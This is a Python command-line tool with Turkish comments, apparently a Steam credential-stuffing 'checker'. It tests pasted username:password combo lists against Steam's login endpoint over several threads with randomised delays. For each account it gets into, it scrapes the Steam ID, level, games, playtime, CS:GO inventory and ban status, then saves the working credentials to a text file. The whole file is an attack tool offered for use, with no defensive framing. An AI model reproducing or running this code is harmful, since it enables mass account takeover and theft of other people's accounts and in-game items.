#!/usr/bin/env python3
# KSIB STEAM CHECKER v2 - Manuel Testle Çalışan
import requests, threading, random, time, sys, os, re
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

SIFRE = "admiral71100daphne"

def giris():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n🔐 KSIB GİRİŞ\n")
    for i in range(3):
        s = input(Fore.YELLOW + "🔑 Şifre: ")
        if s == SIFRE:
            return True
        print(Fore.RED + f"❌ Hatalı! ({2-i} hakkın)")
    sys.exit(0)

class SteamCheckerV2:
    def __init__(self):
        self.working = []
        self.dead = []
        self.lock = threading.Lock()
        self.checked = 0
        self.start_time = None
        self.running = True
        self.combo_list = []
    
    def bnr(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + """
        ╔══════════════════════════════════════╗
        ║  🎮 STEAM CHECKER v2               ║
        ║  Manuel Testli → API Fixli         ║
        ╚══════════════════════════════════════╝
        """)
    
    def check_login_v2(self, user, pwd):
        """Yeni Steam giriş kontrolü - 2024 çalışan"""
        try:
            session = requests.Session()
            
            # Headers
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "https://store.steampowered.com/login/",
                "Origin": "https://store.steampowered.com",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            }
            session.headers.update(headers)
            
            # Önce login sayfasına git
            login_page = session.get("https://store.steampowered.com/login/", timeout=10)
            
            # DoLogin
            login_url = "https://store.steampowered.com/login/dologin/"
            
            data = {
                "username": user,
                "password": pwd,
                "emailauth": "",
                "captchagid": "-1",
                "captcha_text": "",
                "emailsteamid": "",
                "rsatimestamp": str(int(time.time())),
                "remember_login": "false",
                "twofactorcode": "",
                "loginfriendlyname": "Steam",
                "donotcache": str(int(time.time() * 1000)),
            }
            
            r = session.post(login_url, data=data, timeout=10)
            
            # Yanıtı kontrol et
            text = r.text.lower()
            
            if "steamid" in text or "steam_id" in text:
                return "success", session
            
            # 2FA kontrolü
            if "twofactor" in text or "2fa" in text or "two_factor" in text:
                return "2fa", session
            
            # Captcha
            if "captcha" in text:
                return "captcha", None
            
            # Yanlış şifre
            if "incorrect" in text or "wrong" in text or "invalid" in text:
                return "wrong", None
            
            # Diğer hatalar
            if "error" in text:
                return "error", None
            
            # Bilinmeyen - session dön
            if session.cookies:
                return "unknown", session
            
            return "wrong", None
            
        except Exception as e:
            return "error", None
    
    def get_account_info(self, session):
        """Hesap bilgilerini çek"""
        info = {
            "id": "?", "name": "?", "level": "?", "member": "?",
            "games": "?", "hours": "?", "inv": "?", "vac": "?"
        }
        
        try:
            # Ana sayfa
            r = session.get("https://store.steampowered.com/account/", timeout=10)
            text = r.text
            
            # Steam ID
            id_match = re.search(r'Steam ID: (\d+)', text)
            if id_match:
                info["id"] = id_match.group(1)
            
            # İsim
            name_match = re.search(r'account_name">(.*?)<', text)
            if name_match:
                info["name"] = name_match.group(1)
            
            # VAC
            if "VAC" in text.upper() or "ban" in text.lower():
                info["vac"] = "⚠️ Banlı"
            else:
                info["vac"] = "✅ Temiz"
            
            # Profil sayfası
            profile_url = f"https://steamcommunity.com/profiles/{info['id']}"
            r2 = session.get(profile_url, timeout=10)
            text2 = r2.text
            
            # Level
            level_match = re.search(r'persona_level.*?>(\d+)<', text2)
            if level_match:
                info["level"] = level_match.group(1)
            
            # Üyelik
            member_match = re.search(r'memberSince">(.*?)<', text2)
            if member_match:
                info["member"] = member_match.group(1).strip()
            
            # Oyunlar
            games_url = f"https://steamcommunity.com/profiles/{info['id']}/games/?tab=all"
            r3 = session.get(games_url, timeout=10)
            text3 = r3.text
            
            games = re.findall(r'"name":"(.*?)"', text3)
            playtimes = re.findall(r'"playtime_forever":(\d+)', text3)
            
            if games:
                info["games"] = len(games)
                total_min = sum(int(t) for t in playtimes)
                info["hours"] = total_min // 60
                
                # En çok oynanan
                game_list = list(zip(games, [int(t)//60 for t in playtimes]))
                game_list.sort(key=lambda x: x[1], reverse=True)
                info["top_games"] = game_list[:5]
            else:
                info["games"] = 0
                info["hours"] = 0
                info["top_games"] = []
            
            # Envanter
            inv_url = f"https://steamcommunity.com/inventory/{info['id']}/730/2?count=10"
            r4 = session.get(inv_url, timeout=10)
            if r4.status_code == 200:
                try:
                    inv_data = r4.json()
                    items = len(inv_data.get("assets", []))
                    info["inv"] = f"{items} CS:GO item" if items > 0 else "Boş"
                except:
                    info["inv"] = "?"
            
        except:
            pass
        
        return info
    
    def worker(self, tid):
        while self.running and self.checked < len(self.combo_list):
            with self.lock:
                if self.checked >= len(self.combo_list):
                    break
                idx = self.checked
                self.checked += 1
                cur = self.checked
            
            combo = self.combo_list[idx]
            user, pwd = combo["user"], combo["pass"]
            
            # Giriş dene
            status, session = self.check_login_v2(user, pwd)
            
            with self.lock:
                if status == "success" and session:
                    info = self.get_account_info(session)
                    self.working.append({"user": user, "pass": pwd, "info": info})
                    
                    print(Fore.GREEN + f"  ✅ [{cur}/{len(self.combo_list)}] {user}")
                    print(Fore.WHITE + f"     🆔 {info['id']} | ⭐ Lv.{info['level']} | 📅 {info['member']}")
                    print(Fore.WHITE + f"     🎮 {info['games']} oyun | ⏱️ {info['hours']} saat | 💎 {info['inv']}")
                    print(Fore.WHITE + f"     🚫 VAC: {info['vac']}")
                    
                    if info.get('top_games'):
                        for g, h in info['top_games'][:3]:
                            print(Fore.CYAN + f"     🎯 {g[:30]}: {h}s")
                    
                elif status == "2fa":
                    self.dead.append({"user": user, "reason": "2FA"})
                    print(Fore.YELLOW + f"  🔒 [{cur}/{len(self.combo_list)}] {user} - 2FA Korumalı")
                
                elif status == "captcha":
                    self.dead.append({"user": user, "reason": "Captcha"})
                    print(Fore.MAGENTA + f"  🤖 [{cur}/{len(self.combo_list)}] Captcha! Bekle...")
                    time.sleep(5)
                
                else:
                    self.dead.append({"user": user, "reason": "Yanlış"})
                    if cur % 3 == 0:
                        print(Fore.RED + f"  ❌ [{cur}/{len(self.combo_list)}] Kontrol ediliyor... (✅{len(self.working)})")
                
                if cur % 10 == 0:
                    elapsed = time.time() - self.start_time
                    rate = cur / elapsed if elapsed > 0 else 0
                    eta = (len(self.combo_list) - cur) / rate if rate > 0 else 0
                    print(Fore.CYAN + f"\n  📊 {cur}/{len(self.combo_list)} | ✅{len(self.working)} | ❌{len(self.dead)} | ⚡{rate:.1f}/s | ⏳{eta:.0f}s\n")
            
            time.sleep(random.uniform(0.5, 1.5))
    
    def start(self, threads=3):
        if not self.combo_list:
            print(Fore.RED + "❌ Liste boş!")
            return
        
        print(Fore.CYAN + f"\n🎮 {len(self.combo_list)} hesap kontrol ediliyor...")
        print(Fore.RED + "\n💣 BAŞLATILIYOR...\n")
        
        self.start_time = time.time()
        
        tl = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            tl.append(t)
        
        try:
            for t in tl:
                t.join()
        except KeyboardInterrupt:
            self.running = False
        
        self.sonuc()
    
    def sonuc(self):
        elapsed = time.time() - self.start_time
        total = len(self.combo_list)
        
        print("\n\n" + "="*50)
        print(Fore.GREEN + "📊 SONUÇLAR")
        print("="*50)
        print(f"⏱️  {elapsed:.1f}s | 📨 {total}")
        print(f"✅ Çalışan: {len(self.working)}")
        print(f"🔒 2FA: {sum(1 for d in self.dead if d.get('reason')=='2FA')}")
        print(f"❌ Yanlış: {sum(1 for d in self.dead if d.get('reason')!='2FA')}")
        print("="*50)
        
        if self.working:
            print(Fore.YELLOW + f"\n🎯 ÇALIŞANLAR ({len(self.working)}):")
            for i, acc in enumerate(self.working, 1):
                info = acc['info']
                print(Fore.GREEN + f"\n  [{i}] {acc['user']}:{acc['pass']}")
                print(Fore.WHITE + f"  🆔 {info['id']} | ⭐ Lv.{info['level']} | 📅 {info['member']}")
                print(Fore.WHITE + f"  🎮 {info['games']} oyun | ⏱️ {info['hours']}s | 💎 {info['inv']} | 🚫 {info['vac']}")
                if info.get('top_games'):
                    print(Fore.CYAN + f"  🎯 En çok: {', '.join(g[:20] for g, _ in info['top_games'][:3])}")
            
            with open("steam_working.txt", "w") as f:
                for acc in self.working:
                    f.write(f"{acc['user']}:{acc['pass']}\n")
            print(Fore.GREEN + "\n💾 Kaydedildi: steam_working.txt")
        
        print("="*50 + "\n")

def ana():
    giris()
    checker = SteamCheckerV2()
    checker.bnr()
    
    while True:
        print(Fore.YELLOW + "\n🎮 MENÜ:")
        print(f"1. ✍️  Combo Gir (Şu an: {len(checker.combo_list)} hesap)")
        print("2. 🚀 Başlat")
        print("3. 🚪 Çıkış")
        
        sec = input(Fore.GREEN + "\nSeçim: ").strip()
        
        if sec == "1":
            print(Fore.YELLOW + "\n✍️  Tüm listeyi yapıştır (user:pass):")
            print(Fore.CYAN + "Bitince boş satırda Enter\n")
            
            print(Fore.WHITE + "┌─ YAPIŞTIR ─┐")
            lines = []
            while True:
                line = input(Fore.WHITE + "│ " + Fore.GREEN).strip()
                if not line:
                    break
                lines.append(line)
            print(Fore.WHITE + "└────────────┘")
            
            if lines:
                checker.combo_list = []
                for line in lines:
                    if ':' in line:
                        u, p = line.split(':', 1)
                        checker.combo_list.append({"user": u.strip(), "pass": p.strip()})
                
                print(Fore.GREEN + f"\n✅ {len(checker.combo_list)} hesap eklendi!")
                
                # Göster
                for i, c in enumerate(checker.combo_list[:5], 1):
                    print(Fore.WHITE + f"  [{i}] {c['user']}")
                if len(checker.combo_list) > 5:
                    print(Fore.WHITE + f"  ... +{len(checker.combo_list)-5}")
            
            input(Fore.YELLOW + "\nEnter...")
            checker.bnr()
        
        elif sec == "2":
            if not checker.combo_list:
                print(Fore.RED + "\n❌ Önce combo gir!")
                input("Enter...")
                checker.bnr()
                continue
            
            th = int(input(Fore.GREEN + "\n🧵 Thread (3): ") or "3")
            
            if input(Fore.GREEN + "🚀 Başlat? (E/H): ").upper() == 'E':
                checker.start(th)
                checker.combo_list = []
                checker.working = []
                checker.dead = []
                checker.checked = 0
                input(Fore.YELLOW + "\nEnter...")
                checker.bnr()
        
        elif sec == "3":
            print(Fore.GREEN + "\n👋 Hoşçakal!")
            break

if __name__ == "__main__":
    try:
        ana()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Çıkış!")
        sys.exit(0)
